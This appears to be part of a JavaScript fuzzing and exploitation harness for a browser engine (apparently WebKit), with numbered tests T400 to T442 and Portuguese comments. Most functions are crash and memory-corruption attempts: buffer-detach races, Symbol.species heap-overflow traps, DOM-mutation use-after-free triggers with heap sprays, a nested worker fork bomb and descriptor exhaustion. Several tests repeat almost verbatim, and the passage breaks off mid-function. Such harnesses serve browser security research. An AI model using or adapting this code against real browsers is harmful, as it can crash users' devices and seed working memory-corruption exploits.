    log("Iniciando T400: THE OMEGA ENDGAME (STATE COLLAPSE)...");
    
    // A culminação de vetores de instabilidade
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){postMessage(e.data,[e.data]);}"],{type:'js'})));
    var ab = new ArrayBuffer(1024*1024);
    var el = document.createElement('div');
    document.body.appendChild(el);
    reqFS(el);
    
    var running = true;
    var i = 0;
    
    function loop() {
        if(!running) return;
        i++;
        
        // 1. Worker IPC Race
        try { w.postMessage(ab, [ab]); } catch(e) { ab = new ArrayBuffer(1024*1024); }
        
        // 2. DOM Tree Thrashing
        var span = document.createElement('span');
        el.appendChild(span);
        if(i%3===0) el.innerHTML = "";
        
        // 3. History State Bomb
        if(i%5===0) {
            try { history.replaceState({junk: new Array(1000).fill(1)}, "", "/"+i); } catch(e){}
        }
        
        // 4. FS Toggle
        if(i%20===0) exitFS();
        if(i%20===5) reqFS(el);
        
        // 5. Crypto Noise (Main Thread)
        if(window.crypto) {
             try { crypto.getRandomValues(new Uint8Array(1024)); } catch(e){}
        }

        setTimeout(loop, 10); // Loop rápido
    }
    loop();
    
    setTimeout(function() {
        running = false;
        w.terminate();
        exitFS();
        if(document.body.contains(el)) document.body.removeChild(el);
        log(">> T400: SYSTEM STATE COLLAPSE ATTEMPT FINISHED.");
    }, 5000);
}
function runTest401() {
    log("Iniciando T401: Message Port Transfer Proxy Reentrancy...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){}"],{type:'js'})));
    var arr = [p1];
    
    var proxy = new Proxy(arr, {
        get: function(target, prop) {
            if (prop === 'length') return 1;
            if (prop === '0') {
                p1.close();
                var junk = new ArrayBuffer(1024*1024);
                return p1;
            }
            return target[prop];
        }
    });

    try {
        w.postMessage("trap", proxy);
    } catch(e) {
        log(">> T401 Caught: " + e.message);
    }
    setTimeout(() => w.terminate(), 1000);
}

function runTest402() {
    log("Iniciando T402: Resize Observer Detached Node Walker...");
    var root = document.createElement('div');
    root.innerHTML = "<div><span>A</span><b>B</b></div>".repeat(50);
    document.body.appendChild(root);
    
    var ro = new ResizeObserver(function(entries) {
        if(document.body.contains(root)) document.body.removeChild(root);
        var s = document.createElement('div');
        s.textContent = "ALLOC";
        entries[0].target.appendChild(s);
    });
    
    var walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, null, false);
    ro.observe(root.firstChild);
    
    try {
        while(walker.nextNode()) {
            if(walker.currentNode.tagName === 'B') {
                root.firstChild.style.width = "10px"; 
            }
        }
    } catch(e) {}
    
    setTimeout(() => {
        ro.disconnect();
        if(document.body.contains(root)) document.body.removeChild(root);
        log(">> T402: Observer Walker logic done.");
    }, 1000);
}

function runTest403() {
    log("Iniciando T403: History State Getter Navigation Race...");
    var state = {
        get data() {
            history.back();
            var x = new Float64Array(10000);
            return "pwn";
        }
    };
    
    history.pushState({}, "Initial", "/init");
    
    try {
        history.pushState(state, "Race", "/race");
        history.forward(); 
    } catch(e) {
        log(">> T403 History Error: " + e.message);
    }
}

function runTest404() {
    log("Iniciando T404: RegExp Exec LastIndex Side-Effect Loop...");
    var re = /a/g;
    var s = "aaaaa";
    var p = new Proxy(re, {
        get: function(target, prop) {
            if (prop === 'lastIndex') {
                target.compile("b"); 
                return 0;
            }
            return target[prop];
        }
    });
    
    try {
        RegExp.prototype.exec.call(p, s);
    } catch(e) {
        log(">> T404 RegExp Logic: " + e.message);
    }
}

function runTest405() {
    log("Iniciando T405: Array Buffer View Length Reduction Trap...");
    var ab = new ArrayBuffer(1024);
    var u8 = new Uint8Array(ab);
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){}"],{type:'js'})));
    
    var o = {
        length: 512,
        get 0() {
            w.postMessage(ab, [ab]);
            return 100;
        }
    };
    
    try {
        u8.set(o); 
    } catch(e) {}
    
    w.terminate();
    log(">> T405: Buffer detach set.");
}

function runTest406() {
    log("Iniciando T406: Crypto Worker Terminate Buffer Race...");
    if(!window.crypto) return;
    var b = new Blob([`
        self.onmessage = function() {
            var buf = new Uint8Array(1024 * 1024 * 8);
            crypto.getRandomValues(buf);
            postMessage("ok");
        }
    `], {type:'js'});
    
    var t = setInterval(function() {
        var w = new Worker(URL.createObjectURL(b));
        w.postMessage("start");
        w.terminate(); 
        var spray = new Uint32Array(1024*512).fill(0x11223344);
    }, 30);
    
    setTimeout(() => { clearInterval(t); log(">> T406: Crypto race stopped."); }, 3000);
}

function runTest407() {
    log("Iniciando T407: IndexedDB Upgrade Blocked Transaction Kill...");
    var name = "block_" + Date.now();
    var r1 = indexedDB.open(name, 1);
    
    r1.onsuccess = function(e) {
        var db1 = e.target.result;
        var r2 = indexedDB.open(name, 2);
        
        r2.onupgradeneeded = function(ev) {
            var tx = ev.target.transaction;
            tx.abort(); 
        };
        
        db1.onversionchange = function() {
            db1.close();
            var w = new Worker(URL.createObjectURL(new Blob([""],{type:'js'})));
            w.terminate();
        };
    };
    log(">> T407: IDB locking race.");
}

function runTest408() {
    log("Iniciando T408: Fullscreen Video Text Track Flush...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    var t = v.addTextTrack("subtitles");
    t.mode = "showing";
    reqFS(v);
    
    var intv = setInterval(function() {
        for(var i=0; i<50; i++) t.addCue(new VTTCue(i, i+1, "X".repeat(100)));
        v.textTracks[0].mode = "hidden";
        t = v.addTextTrack("captions");
        t.mode = "showing";
        v.style.display = "none";
        v.offsetHeight;
        v.style.display = "block";
    }, 40);
    
    setTimeout(() => {
        clearInterval(intv);
        exitFS();
        document.body.removeChild(v);
        log(">> T408: Track flush done.");
    }, 3000);
}

function runTest409() {
    log("Iniciando T409: XHR Sync Blob Descriptor Revocation...");
    var data = new Uint8Array(1024*1024).fill(65);
    var u = URL.createObjectURL(new Blob([data]));
    
    var t = setInterval(function() {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", u, false);
        setTimeout(() => URL.revokeObjectURL(u), 0);
        try { xhr.send(); } catch(e){}
        u = URL.createObjectURL(new Blob([data]));
    }, 10);
    
    setTimeout(() => {
        clearInterval(t);
        URL.revokeObjectURL(u);
        log(">> T409: XHR sync race stopped.");
    }, 3000);
}

function runTest410() {
    log("Iniciando T410: THE KERNEL COLLAPSE (ASYNC STORM)...");
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){try{postMessage(e.data,[e.data]);}catch(z){}}"],{type:'js'})));
    var ab = new ArrayBuffer(1024*1024);
    var el = document.createElement('div');
    document.body.appendChild(el);
    reqFS(el);
    
    var i = 0;
    var t = setInterval(function() {
        i++;
        try { w.postMessage(ab, [ab]); } catch(e) { ab = new ArrayBuffer(1024*1024); }
        if(i%5===0) {
            var f = document.createElement('iframe');
            document.body.appendChild(f);
            f.src = "about:blank";
            setTimeout(()=>document.body.removeChild(f), 10);
        }
        if(i%15===0) { if(Math.random()>0.5) exitFS(); else reqFS(el); }
        if(window.crypto) try { crypto.getRandomValues(new Uint8Array(256)); } catch(e){}
    }, 20);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        exitFS();
        if(document.body.contains(el)) document.body.removeChild(el);
        log(">> T410: Collapse sequence finished.");
    }, 5000);
}
function runTest411() {
    log("Iniciando T411: TypedArray Species Overflow Trap...");
    var P = new Proxy(Uint8Array, {
        get: function(target, prop) {
            if (prop === Symbol.species) return function(len) {
                return new Uint8Array(new ArrayBuffer(0)); 
            };
            return target[prop];
        }
    });
    try {
        var src = new Uint8Array(1024).fill(0xCC);
        Object.setPrototypeOf(src, P.prototype);
        src.constructor = P;
        var res = src.map(x => x); 
        res.set(src);
    } catch(e) {
        log(">> T411 Logic: " + e.message);
    }
}

function runTest412() {
    log("Iniciando T412: Message Port Close Transfer Race...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){}"],{type:'js'})));
    var obj = {
        get port() {
            p1.close();
            var spray = new Uint32Array(2000).fill(0xDEADBEEF);
            return p1;
        }
    };
    try {
        w.postMessage({target: obj.port}, [p1]);
    } catch(e) {
        log(">> T412 Blocked: " + e.message);
    }
    setTimeout(() => w.terminate(), 1000);
}

function runTest413() {
    log("Iniciando T413: Tree Walker Filter Node Removal...");
    var root = document.createElement('div');
    root.innerHTML = "<span>A</span><b>B</b><i>C</i>".repeat(50);
    document.body.appendChild(root);
    var tw = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, {
        acceptNode: function(node) {
            if(node.tagName === 'B') {
                if(node.nextSibling) root.removeChild(node.nextSibling);
                root.removeChild(node);
                return NodeFilter.FILTER_ACCEPT;
            }
            return NodeFilter.FILTER_SKIP;
        }
    });
    try {
        while(tw.nextNode()) { var x = tw.currentNode.tagName; }
    } catch(e) {}
    setTimeout(() => { if(document.body.contains(root)) document.body.removeChild(root); }, 1000);
}

function runTest414() {
    log("Iniciando T414: RegExp Compile Side-Effect Crash...");
    var re = /a/g;
    var s = "a".repeat(1000);
    var p = new Proxy(re, {
        get: function(t, k) {
            if(k === 'lastIndex') {
                t.compile("b");
                return 0;
            }
            return t[k];
        }
    });
    try {
        RegExp.prototype.exec.call(p, s);
    } catch(e) {
        log(">> T414 RegExp Logic: " + e.message);
    }
}

function runTest415() {
    log("Iniciando T415: History State Cyclic Proxy Bomb...");
    var p = new Proxy({}, {
        get: function(t, k) { return p; }
    });
    try {
        history.pushState(p, "Proxy", "/crash");
        var f = document.createElement('iframe');
        document.body.appendChild(f);
        f.contentWindow.location.reload();
        setTimeout(() => document.body.removeChild(f), 200);
    } catch(e) {
        log(">> T415 History Error: " + e.message);
    }
}

function runTest416() {
    log("Iniciando T416: Crypto Thread Memory Unmap Race...");
    if(!window.crypto) return;
    var b = new Blob([`self.onmessage=function(){var b=new Uint8Array(1024*1024*8);crypto.getRandomValues(b);postMessage('ok');}`], {type:'js'});
    var t = setInterval(function() {
        var w = new Worker(URL.createObjectURL(b));
        w.postMessage("start");
        w.terminate();
        var s = new Uint32Array(1024*1024).fill(0xCAFEBABE);
    }, 25);
    setTimeout(() => { clearInterval(t); log(">> T416: Crypto race stopped."); }, 3000);
}

function runTest417() {
    log("Iniciando T417: IndexedDB Version Blocked Kill...");
    var n = "db_" + Date.now();
    var r1 = indexedDB.open(n, 1);
    r1.onsuccess = function(e) {
        var db = e.target.result;
        var r2 = indexedDB.open(n, 2);
        r2.onupgradeneeded = function(ev) { ev.target.transaction.abort(); };
        db.onversionchange = function() {
            db.close();
            var w = new Worker(URL.createObjectURL(new Blob([""],{type:'js'})));
            w.terminate();
        };
    };
    log(">> T417: IDB Lock initiated.");
}

function runTest418() {
    log("Iniciando T418: Video Track Cue Renderer Panic...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    var t = v.addTextTrack("subtitles");
    t.mode = "showing";
    reqFS(v);
    var iv = setInterval(function() {
        for(var i=0; i<20; i++) t.addCue(new VTTCue(i, i+1, "X".repeat(200)));
        v.textTracks[0].mode = "hidden";
        t = v.addTextTrack("captions");
        t.mode = "showing";
        v.style.display = "none"; v.offsetHeight; v.style.display = "block";
    }, 30);
    setTimeout(() => { clearInterval(iv); exitFS(); document.body.removeChild(v); }, 3000);
}

function runTest419() {
    log("Iniciando T419: Blob File Descriptor Exhaustion...");
    var arr = [];
    for(var i=0; i<100; i++) arr.push(new Uint8Array(1024).fill(i));
    var t = setInterval(function() {
        var b = new Blob(arr);
        var u = URL.createObjectURL(b);
        var x = new XMLHttpRequest();
        x.open("GET", u, false);
        try { x.send(); } catch(e){}
        URL.revokeObjectURL(u);
    }, 5);
    setTimeout(() => { clearInterval(t); log(">> T419: FD race stopped."); }, 3000);
}

function runTest420() {
    log("Iniciando T420: THE SYSTEM FRACTURE (ALL VECTORS)...");
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){try{postMessage(e.data,[e.data]);}catch(z){}}"],{type:'js'})));
    var ab = new ArrayBuffer(1024*1024);
    var el = document.createElement('div');
    document.body.appendChild(el);
    reqFS(el);
    var i = 0;
    var t = setInterval(function() {
        i++;
        try { w.postMessage(ab, [ab]); } catch(e) { ab = new ArrayBuffer(1024*1024); }
        if(i%5===0) { var f=document.createElement('iframe'); document.body.appendChild(f); setTimeout(()=>document.body.removeChild(f),10); }
        if(i%10===0) { if(Math.random()>0.5) exitFS(); else reqFS(el); }
        if(window.crypto) try{crypto.getRandomValues(new Uint8Array(128));}catch(e){}
    }, 20);
    setTimeout(() => { clearInterval(t); w.terminate(); exitFS(); document.body.removeChild(el); log(">> T420: Fracture complete."); }, 5000);
}
 // 421. Crypto API: Uso de buffer detached em chamada de sistema
    function runTest421() {
        log("Init 421: Crypto Detach Race...");
        try {
            const buf = new Uint8Array(1024 * 1024);
            const w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>{}"],{type:'text/javascript'})));
            // Prepara a chamada crypto
            const cryptoCall = () => {
                try { window.crypto.getRandomValues(buf); } catch(e) {}
            };
            // Race: Transfere o buffer (detach) enquanto tenta escrever nele via Crypto
            // O objetivo é fazer o Kernel escrever em um ponteiro que o JS acabou de invalidar
            const iv = setInterval(() => {
                if(buf.byteLength > 0) {
                    w.postMessage(buf.buffer, [buf.buffer]);
                    cryptoCall(); // Tenta acessar pos-detach
                } else {
                    clearInterval(iv);
                    w.terminate();
                    log("SUCCESS: Buffer detached during syscall.");
                }
            }, 5);
        } catch(e) { log("ERR: " + e.message); }
    }

    // 422. ResizeObserver: Modificação do DOM durante callback de layout
    function runTest422() {
        log("Init 422: ResizeObserver UAF...");
        const div = document.createElement('div');
        document.body.appendChild(div);
        div.style.width = "100px";
        let count = 0;
        const ro = new ResizeObserver(() => {
            if(count++ > 10) {
                ro.disconnect();
                // Destroi o elemento sendo observado DENTRO do callback de observação
                // O WebKit pode tentar acessar propriedades de layout do elemento morto logo após
                div.remove(); 
                const trash = new Array(1000).fill(1.1); // Heap spray simples
                log("SUCCESS: Element removed inside observer loop.");
                return;
            }
            div.style.width = (100 + count) + "px"; // Força re-trigger
            div.innerHTML = "<b>test</b>".repeat(100); // Complexidade de layout
        });
        ro.observe(div);
    }

    // 423. History API: Objeto com getter malicioso durante serialização
    function runTest423() {
        log("Init 423: History State Corruption...");
        try {
            const evil = {
                get a() {
                    // Efeito colateral: Limpa o histórico ou navega enquanto serializa 'b'
                    history.replaceState(null, "", null);
                    // Retorna objeto grande para forçar alocação
                    return new Uint8Array(1024*1024).fill(0x41);
                },
                b: 0xDEADBEEF
            };
            // pushState usa serialização estruturada. O getter roda no meio do processo C++.
            // Alterar o estado global durante a serialização pode corromper o ponteiro de estado.
            for(let i=0; i<50; i++) {
                history.pushState(evil, "crash"+i, null);
            }
            log("SUCCESS: State serialization race executed.");
        } catch(e) { log("ERR: " + e.message); }
    }

    // 424. Range API: Mutação de DOM cruzada com NodeIterator
    function runTest424() {
        log("Init 424: Range vs Iterator...");
        const root = document.createElement('div');
        root.innerHTML = "<span>A</span><span>B</span><span>C</span>";
        document.body.appendChild(root);
        const range = document.createRange();
        range.selectNodeContents(root);
        const ni = document.createNodeIterator(root, NodeFilter.SHOW_ELEMENT);
        ni.nextNode(); // root
        
        try {
            // extractContents remove nós do DOM. 
            // Se o NodeIterator estiver apontando para um nó que será movido para o fragmento,
            // a engine precisa atualizar o ponteiro. Race conditions aqui causam UAF.
            const span = root.querySelector('span');
            ni.nextNode(); // aponta para o span
            
            // MutationObserver para pegar o momento exato da remoção
            const obs = new MutationObserver(() => {
                ni.previousNode(); // Tenta mover o iterador num DOM instável
                root.innerHTML = ""; // Destroi tudo
            });
            obs.observe(root, {childList: true, subtree:true});
            
            range.extractContents();
            log("SUCCESS: DOM Mutation race executed.");
        } catch(e) { log("ERR: " + e.message); }
    }

    // 425. TypedArray: Constructor Species Confusion
    function runTest425() {
        log("Init 425: TypedArray Species...");
        class LeakyArray extends Uint8Array {
            static get [Symbol.species]() {
                return function(len) {
                    // Retorna um array menor que o esperado pelo motor C++
                    // O motor calcula offset baseado no original, mas escreve no novo
                    return new Uint8Array(0); 
                };
            }
        }
        try {
            const original = new LeakyArray(1024).fill(1);
            // map usa Species para criar o array de retorno.
            // Se a implementação não checar o tamanho do array retornado por Species...
            // Heap Overflow (Write)
            original.map(x => x + 1);
            log("SUCCESS: Map executado com Species malicioso.");
        } catch(e) { log("ERR: " + e.message); }
    }

    // 426. Kernel: Circular IPC Ring Panic
    function runTest426() {
        log("Init 426: IPC Ring Panic...");
        const ring = [];
        const size = 100;
        try {
            for(let i=0; i<size; i++) ring.push(new MessageChannel());
            // Cria um anel fechado: Porta N envia para Porta N+1
            for(let i=0; i<size; i++) {
                const next = (i+1) % size;
                ring[i].port1.postMessage("Ref", [ring[next].port1]);
            }
            // Worker "Assassino": recebe uma porta e fecha, causando cascata de deref
            const wCode = `onmessage=e=>{try{e.data.close()}catch(x){}}`;
            const w = new Worker(URL.createObjectURL(new Blob([wCode],{type:'text/javascript'})));
            // Joga o início do anel no worker e mata o worker
            w.postMessage(ring[0].port2, [ring[0].port2]);
            setTimeout(() => {
                w.terminate();
                // Fecha o resto manualmente para estressar o GC de portas do Kernel
                for(let i=1; i<size; i++) try{ring[i].port2.close()}catch(x){}
                log("SUCCESS: Anel de referência órfão criado no Kernel.");
            }, 200);
        } catch(e) { log("ERR: " + e.message); }
    }

    // 427. Kernel: LocalStorage IPC Broadcast Storm
    function runTest427() {
        log("Init 427: Storage IPC Storm...");
        const frames = [];
        try {
            // Cria ouvintes de evento de storage (cada um registra um handle no kernel)
            for(let i=0; i<50; i++) {
                const f = document.createElement('iframe');
                document.body.appendChild(f);
                f.contentWindow.onstorage = () => { const v = new Uint8Array(1024); };
                frames.push(f);
            }
            let k = 0;
            const iv = setInterval(() => {
                // Dispara broadcast IPC para todos os frames
                localStorage.setItem("k"+k, Math.random());
                // Remove frames aleatoriamente durante o broadcast
                // O kernel tenta entregar mensagem para processo que está morrendo
                if(k % 5 === 0 && frames.length > 0) {
                    const r = frames.pop();
                    document.body.removeChild(r);
                }
                if(k++ > 100) {
                    clearInterval(iv);
                    log("SUCCESS: Race condition de Storage IPC disparada.");
                }
            }, 5);
        } catch(e) { log("ERR: " + e.message); }
    }

    // 428. Kernel: Blob VFS Race
    function runTest428() {
        log("Init 428: VFS Fetch/Revoke...");
        const b = new Blob([new Uint8Array(1024*1024*2).fill(0xCC)]);
        const u = URL.createObjectURL(b);
        // Worker faz fetch em loop apertado
        const wCode = `onmessage=e=>{
            const u=e.data;
            const t=Date.now();
            while(Date.now()-t<500){
                fetch(u).then(r=>r.arrayBuffer()).catch(()=>{});
            }
        }`;
        const uW = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
        const workers = [];
        try {
            for(let i=0; i<10; i++) {
                const w = new Worker(uW);
                w.postMessage(u);
                workers.push(w);
            }
            // Revoga a URL e mata os workers enquanto eles estão lendo o arquivo virtual
            // Isso causa conflito no lock do vnode no Kernel
            setTimeout(() => {
                URL.revokeObjectURL(u);
                workers.forEach(w => w.terminate());
                log("SUCCESS: VFS Handle race executada.");
            }, 100);
        } catch(e) { log("ERR: " + e.message); }
    }

    // 429. Kernel: Deep Nested Port Stack Overflow
    function runTest429() {
        log("Init 429: Deep Port Stack...");
        const root = new MessageChannel();
        let curr = { p: root.port1 };
        // Cria objeto profundamente aninhado contendo portas
        // O Kernel precisa serializar isso recursivamente. Stack Overflow potencial.
        for(let i=0; i<500; i++) {
            const next = new MessageChannel();
            curr = { next: curr, port: next.port1 };
        }
        try {
            const w = new Worker(URL.createObjectURL(new Blob(["onmessage=()=>{}"],{type:'text/javascript'})));
            // Coleta todas as portas para a array de transferência
            const transfer = [];
            let t = curr;
            while(t) { if(t.port) transfer.push(t.port); if(t.p) transfer.push(t.p); t = t.next; }
            
            w.postMessage(curr, transfer);
            setTimeout(() => w.terminate(), 200);
            log("SUCCESS: Objeto recursivo profundo enviado ao Kernel.");
        } catch(e) { log("ERR: " + e.message); }
    }

    // 430. Kernel: FileReader Descriptor Exhaustion
    function runTest430() {
        log("Init 430: FD Exhaustion...");
        const b = new Blob([new Uint8Array(1024*1024*8).fill(0x00)]);
        const readers = [];
        try {
            // Tenta abrir milhares de file handles simultaneamente
            const limit = 4000; 
            for(let i=0; i<limit; i++) {
                const fr = new FileReader();
                // Ler pedaços pequenos força criação de novos descritores sem fechar os antigos rápido o suficiente
                fr.readAsArrayBuffer(b.slice(i*10, i*10+10));
                readers.push(fr);
                // Adiciona pressão de criação/destruição de threads para fragmentar a tabela de processos
                if(i % 500 === 0) {
                    const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/javascript'})));
                    w.terminate();
                }
            }
            log("SUCCESS: " + limit + " leituras concorrentes disparadas.");
        } catch(e) { log("ERR: " + e.message); }
    }
function runTest431() {
        log("Init 431: History + DOM Thrashing...");
        let root = document.createElement('div');
        document.body.appendChild(root);
        const stateObj = { data: new Uint8Array(1024*1024).fill(0xAA) };
        let depth = 0;
        const i = setInterval(() => {
            try {
                if(depth++ % 2 === 0) {
                    const span = document.createElement('span');
                    span.textContent = "A".repeat(1000);
                    root.appendChild(span);
                    history.pushState(stateObj, "d"+depth, null);
                } else {
                    if(root.lastChild) root.removeChild(root.lastChild);
                    history.replaceState(null, "r"+depth, null);
                }
                if(depth > 500) {
                    root.innerHTML = ""; 
                    const large = new Array(10000).fill(1.1);
                }
                if(depth > 1000) {
                    clearInterval(i);
                    document.body.removeChild(root);
                    log("SUCCESS: History/DOM thrashing complete.");
                }
            } catch(e) {}
        }, 1);
    }

    function runTest432() {
        log("Init 432: TypedArray Detach Race...");
        const code = `self.onmessage=e=>{
            const {b, id} = e.data;
            const v = new Uint8Array(b);
            v[0] = 1; 
            self.postMessage("ack");
            if(id % 5 === 0) self.close();
        }`;
        const u = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
        const buf = new ArrayBuffer(1024*1024*4);
        const w = new Worker(u);
        try {
            w.postMessage({b: buf, id: 1}, [buf]);
            if(buf.byteLength > 0) {
                const v = new Uint8Array(buf);
                v[0] = 0xFF; 
                log("FAIL: Buffer not detached.");
            } else {
                try {
                    const zombie = new Uint8Array(buf); 
                    zombie[0] = 0xAA; 
                } catch(e) {} 
            }
            setTimeout(() => { w.terminate(); log("SUCCESS: Detach logic executed."); }, 200);
        } catch(e) { log("ERR: " + e.message); }
    }

    function runTest433() {
        log("Init 433: TreeWalker UAF...");
        const container = document.createElement('div');
        container.innerHTML = "<div><span>A</span><b>B</b></div>".repeat(100);
        document.body.appendChild(container);
        const tw = document.createTreeWalker(container, NodeFilter.SHOW_ELEMENT);
        const mo = new MutationObserver(() => {
            container.innerHTML = ""; 
            const trash = new Array(5000).fill(1); 
        });
        mo.observe(container, {childList: true, subtree: true});
        try {
            let n = tw.nextNode();
            let c = 0;
            while(n) {
                if(c++ === 50) {
                    const child = container.querySelector('span');
                    if(child) child.remove(); 
                }
                n = tw.nextNode();
                if(c > 200) break;
            }
            log("SUCCESS: TreeWalker race executed.");
        } catch(e) { log("ERR: " + e.message); }
        if(document.body.contains(container)) document.body.removeChild(container);
    }

    function runTest434() {
        log("Init 434: DataView Misalignment GC...");
        const bufs = [];
        try {
            let k = 0;
            const iv = setInterval(() => {
                const b = new ArrayBuffer(1024 * 64);
                const v1 = new DataView(b, 1); 
                const v2 = new DataView(b, 3);
                v1.setUint8(0, 0xAA);
                bufs.push({b, v1, v2});
                if(bufs.length > 1000) {
                    bufs.splice(0, 500); 
                    const pressure = new Uint32Array(1024*1024).fill(0xDEADBEEF);
                }
                if(k++ > 200) {
                    clearInterval(iv);
                    log("SUCCESS: DataView alignment stress.");
                }
            }, 5);
        } catch(e) { log("ERR: " + e.message); }
    }

    function runTest435() {
        log("Init 435: Blob URL Revoke Race...");
        const b = new Blob([new Uint8Array(1024*1024*5).fill(0xCC)]);
        const u = URL.createObjectURL(b);
        const wCode = `onmessage=e=>{
            const u=e.data;
            const t=Date.now();
            while(Date.now()-t<500) {
                fetch(u).then(r=>r.arrayBuffer()).then(b=>postMessage(b.byteLength)).catch(()=>{});
            }
        }`;
        const uW = URL.createObjectURL(new Blob([wCode], {type:'text/javascript'}));
        const workers = [];
        for(let i=0; i<10; i++) {
            const w = new Worker(uW);
            w.postMessage(u);
            workers.push(w);
        }
        setTimeout(() => {
            URL.revokeObjectURL(u); 
            workers.forEach(w => w.terminate()); 
            log("SUCCESS: VFS Handle revoke race.");
        }, 100);
    }

    function runTest436() {
        log("Init 436: IPC Ring Panic...");
        const size = 150;
        const ring = [];
        try {
            for(let i=0; i<size; i++) ring.push(new MessageChannel());
            for(let i=0; i<size; i++) {
                const next = (i + 1) % size;
                ring[i].port1.postMessage("link", [ring[next].port1]);
            }
            const killer = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>{e.data.close()}"],{type:'text/javascript'})));
            killer.postMessage(ring[0].port2, [ring[0].port2]);
            setTimeout(() => {
                killer.terminate();
                for(let i=1; i<size; i++) {
                    try { ring[i].port2.postMessage("ping"); ring[i].port2.close(); } catch(e){}
                }
                log("SUCCESS: Refcount ring broken.");
            }, 200);
        } catch(e) { log("ERR: " + e.message); }
    }

    function runTest437() {
        log("Init 437: FD Exhaustion Slice...");
        const b = new Blob([new Uint8Array(1024*1024*10).fill(0x00)]);
        const readers = [];
        const limit = 5000;
        try {
            for(let i=0; i<limit; i++) {
                const fr = new FileReader();
                fr.readAsArrayBuffer(b.slice(i*10, i*10+5));
                readers.push(fr);
                if(i % 500 === 0) {
                    const w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/javascript'})));
                    w.terminate();
                }
            }
            log("SUCCESS: 5000+ FD handles requested.");
        } catch(e) { log("ERR: " + e.message); }
    }

    function runTest438() {
        log("Init 438: Broadcast & Storage Storm...");
        const name = "storm_" + Date.now();
        const bc = new BroadcastChannel(name);
        const iframes = [];
        for(let i=0; i<40; i++) {
            const f = document.createElement('iframe');
            document.body.appendChild(f);
            f.contentWindow.onstorage = () => {}; 
            iframes.push(f);
        }
        let k = 0;
        const wCode = `const bc=new BroadcastChannel('${name}'); onmessage=()=>{bc.postMessage(new Uint8Array(1024));}`;
        const uW = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
        const workers = [];
        for(let i=0; i<10; i++) workers.push(new Worker(uW));
        
        const iv = setInterval(() => {
            workers.forEach(w => w.postMessage("go"));
            localStorage.setItem("k"+k, Math.random());
            if(k % 5 === 0 && iframes.length > 0) {
                const f = iframes.pop();
                document.body.removeChild(f);
            }
            if(k++ > 100) {
                clearInterval(iv);
                workers.forEach(w => w.terminate());
                bc.close();
                log("SUCCESS: IPC/Event storm finished.");
            }
        }, 10);
    }

    function runTest439() {
        log("Init 439: Nested Fork Bomb...");
        const code = `self.onmessage=e=>{
            const d = e.data;
            if(d > 0) {
                const w1 = new Worker(self.location.href); w1.postMessage(d-1);
                const w2 = new Worker(self.location.href); w2.postMessage(d-1);
            } else {
                setInterval(()=>{}, 100);
            }
        }`;
        // Blob auto-referente
        const b = new Blob([code.replace("self.location.href", "self.u")], {type:'text/javascript'});
        const u = URL.createObjectURL(b);
        const boot = `self.onmessage=e=>{self.u='${u}'; const w=new Worker(self.u); w.postMessage(8);}`; 
        const uBoot = URL.createObjectURL(new Blob([boot],{type:'text/javascript'}));
        try {
            const root = new Worker(uBoot);
            root.postMessage("start");
            setTimeout(() => {
                root.terminate();
                log("SUCCESS: Scheduler tree pruned.");
            }, 1000);
        } catch(e) { log("ERR: " + e.message); }
    }

    function runTest440() {
        log("Init 440: Pipe Overflow Zombie...");
        const ch = new MessageChannel();
        const payload = new Uint8Array(1024 * 32).fill(0xFF); // 32KB
        const wCode = `onmessage=e=>{e.data.close()}`;
        const u = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
        try {
            let count = 0;
            const iv = setInterval(() => {
                for(let i=0; i<50; i++) {
                    ch.port1.postMessage(payload);
                    count++;
                }
                if(count > 3000) { // ~96MB buffered
                    clearInterval(iv);
                    const w = new Worker(u);
                    w.postMessage(ch.port2, [ch.port2]); 
                    setTimeout(() => {
                        w.terminate(); 
                        ch.port1.close();
                        log("SUCCESS: Kernel pipe overflow zombie created.");
                    }, 100);
                }
            }, 5);
        } catch(e) { log("ERR: " + e.message); }
    }
// 441. WebKit: MutationObserver vs Range Extract UAF
    // Combina: DOM, MutationObserver, Range API
    // Objetivo: Remover nós do DOM *enquanto* o motor C++ está extraindo conteúdo.
    function runTest441() {
        log("Init 441: DOM Range UAF...");
        const root = document.createElement('div');
        const s1 = document.createElement('span');
        const s2 = document.createElement('span');
        root.appendChild(s1); root.appendChild(s2);
        document.body.appendChild(root);
        
        const range = document.createRange();
        range.setStartBefore(s1);
        range.setEndAfter(s2);
        
        const mo = new MutationObserver(() => {
            // Callback roda sincronicamente em microtask checkpoints
            root.innerHTML = ""; // Destroi a árvore sob os pés do Range
            const spray = new Array(10000).fill({a:0x41414141});
        });
        mo.observe(root, {childList: true, subtree: true});
        
        try {
            // Trigger: Modificar DOM para disparar MO, depois forçar Range
            s1.textContent = "trigger";
            const frag = range.extractContents(); // Ponto crítico
            log("SUCCESS: Range logic survived DOM destruction.");
        } catch(e) { log("ERR: " + e.message); }
        if(document.body.contains(root)) document.body.removeChild(root);
    }

    // 442. WebKit: Array.sort Buffer Detach Race
    // Combina: TypedArray, Worker, Array.prototype.sort
    // Objetivo: Detachar (neuter) o buffer subjacente *durante* a execução do algoritmo de sort nativo.
    function runTest442() {
        log("Init 442: Sort Detach Race...");
        const buf = new ArrayBuffer(1024 * 1024 * 4);
        const arr = new Float64Array(buf);
        for(let i=0; i<arr.length; i++) arr[i] = Math.random();
        
        const w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>{}"],{type:'text/javascript'})));
        
